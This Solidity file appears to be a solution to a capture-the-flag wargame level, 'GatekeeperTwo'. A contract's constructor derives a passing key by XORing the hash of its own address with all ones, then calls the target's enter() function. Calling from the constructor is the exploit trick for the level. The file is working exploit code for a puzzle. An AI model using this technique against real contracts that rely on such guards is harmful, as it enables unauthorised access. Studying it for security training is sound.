// SPDX-License-Identifier: MIT
pragma solidity ^0.6.6;

import "./GatekeeperTwo.sol";

contract HackGatekeeperTwo {

    constructor(address target) public {
        GatekeeperTwo gate = GatekeeperTwo(target);
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
        gate.enter(key);
    }

}